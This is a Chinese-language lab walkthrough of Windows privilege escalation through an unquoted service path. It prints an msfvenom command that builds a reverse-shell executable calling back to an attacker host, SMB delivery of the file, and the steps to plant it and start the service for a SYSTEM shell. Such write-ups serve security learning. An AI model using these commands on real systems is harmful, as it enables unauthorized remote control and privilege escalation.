# **0x01:制作反弹shell+传送到目标机器**

为了控制一波我们的windows10,我们得先在kali本地制作一个反弹shell先。

命令:

msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=10.4.37.12 LPORT=667 -f exe -o reverseshell.exe

![](../Images/121dd0de7c93762c4aee58c629fd6882.png)

  

![](../Images/5faf784a08b08422bdd7ee16da0b2cd8.png)

  

  

关于传送的到目标机器可以用kali自带的smbserver

命令: sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

![](../Images/0c1e61f1b6ec95d132354cec93fecaca.png)

  

![](../Images/5faf784a08b08422bdd7ee16da0b2cd8.png)

  

  

然后在我们的windows10的CMD命令行模式下输入

命令:copy \\\\10.4.37.12\\kali\\revershell.exe C:\\PrivEsc\\reverseshell.exe

![](../Images/5ce0109be9a48d13330011cd0e7d99fd.png)

  

![](../Images/5faf784a08b08422bdd7ee16da0b2cd8.png)

# **0x02:没引号的服务路径提权**

现在进入正题，由于网页版只提供命令，也没有很细致的讲解，只能自己再网上找点额外的资料理解一波原理。参考一下大佬的思路

  

![](../Images/5faf784a08b08422bdd7ee16da0b2cd8.png)

  

  

       在正常情况下，如果Windows启动了某个服务，Windows会自动搜索它的二进制文件(BINARY\_PATH\_NAME)来运行。当运行服务时,如果给出了可执行文件+完整路径如下图所示,这种有引号括起来的完整路径，系统会按照位置执行。

![](../Images/4cfe6e19b7334272d574a986a2ea8d41.png)

  

![](../Images/5faf784a08b08422bdd7ee16da0b2cd8.png)

  

  

与之相比如果服务的二进制路径没有引号的话，系统会执行找到的空格分隔的服务路径的第一个实例。

![](../Images/fadfc12980d79aee0c51f80a19fca844.png)

  

![](../Images/5faf784a08b08422bdd7ee16da0b2cd8.png)

  

  

当然上面这个例子其实不太好这里引用了https://blog.csdn.net/weixin\_44032232/article/details/109073666 这位大佬的解释

  

比如说现在有个服务的路径是c:\\program files (x86)\\grasssoft\\macro expert\\MacroService.exe

  

![](../Images/5faf784a08b08422bdd7ee16da0b2cd8.png)

  

  

那么会根据以下顺序依次读取(有空格就停止一次)

1.c:\\program.exe

2.c:\\program files.exe

3.c:\\program file (x86)\\grasssoft\\macro.exe

4.c:\\program files (x86)\\grasssoft\\macro expert\\MacroService.exe

  

![](../Images/5faf784a08b08422bdd7ee16da0b2cd8.png)

  

  

首先在用nc连接好目标机以后用sc qc 查询unquotedsvc服务可以看到服务路径(BINARY\_PATH\_NAME)未用引号且SERVICE\_START\_NAME显示目前这个服务是System权限。

![](../Images/5d304d5fea41b373604e73b2bc088d41.png)

  

![](../Images/5faf784a08b08422bdd7ee16da0b2cd8.png)

  

  

然后用accesschk.exe 检测一波unquotedsvc谁可以使用,当然可以看到作为普通的users也可以更改。

(/accepteula=自动接收许可协议 \-u\=不显示错误 \-w=显示谁有可写权限 \-d=只处理目录或顶级建 \-q=忽略banner)

![](../Images/8de853952f3d4e54978aabfc0063972d.png)

  

![](../Images/5faf784a08b08422bdd7ee16da0b2cd8.png)

  

  

那我们可以使用copy大法把我们的反弹文件指向unquoted 的commonfiles里面

![](../Images/b249c2330a81483e04ccfe10870f5d62.png)

  

![](../Images/5faf784a08b08422bdd7ee16da0b2cd8.png)

  

  

最后用net start 启动回服务,提前开启nc得到一个更高的权限。

![](../Images/3be4e47262ba51e922d02196e454e34f.png)
